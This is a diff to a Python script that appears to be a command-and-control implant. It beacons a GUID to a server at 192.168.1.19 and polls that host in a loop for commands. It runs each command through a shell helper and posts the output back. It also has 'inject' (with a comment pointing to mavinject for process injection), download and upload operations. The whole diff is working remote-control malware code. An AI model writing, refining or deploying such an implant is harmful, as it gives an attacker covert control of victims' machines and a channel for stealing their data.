@@ -52,18 +52,20 @@ def blehhhh(url, ext):
 
 
 GUID = uuid.uuid4()
+
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 ',
-    'APPSESSIONID':f'{GUID}'
+    'APPSESSIONID':f'{GUID}',
 }
+
 # Send our HELLO/GUID
-requests.get(f'http://127.0.0.1:5000/', headers=headers)
+requests.get(f'http://192.168.1.19:8080/', headers=headers)
  
 # Below is the cert requirements for mTLS when using requests
 # , cert=('client.crt', 'client.key'), verify='ca.crt'
 time.sleep(60)
 while 1:
-    a = requests.get(f'http://127.0.0.1:80/{GUID}.html', headers=headers)
+    a = requests.get(f'http://192.168.1.19/{GUID}.html', headers=headers)
     cmd = a.text
     print('got command')
     print(cmd)
@@ -73,10 +75,10 @@ while 1:
 
     if op == 'cmd':
         returned = bleh(cm)
-        response = requests.post('127.0.0.1/returned', data=returned, headers=headers)
+        response = requests.post('http://192.168.1.19:8080/returned', data=returned, headers=headers)
     if op == 'inject': # We can use mavinject from cmd prompt
         returned = bleh(cm)
-        response = requests.post('127.0.0.1/returned', data=returned, headers=headers)
+        response = requests.post('http://192.168.1.19:8080/returned', data=returned, headers=headers)
     if op == 'download':
         blehhhh(cm, ex)
     if op == 'upload':
@@ -84,4 +86,3 @@ while 1:
     else:
         print('nada')
     time.sleep(20)
-
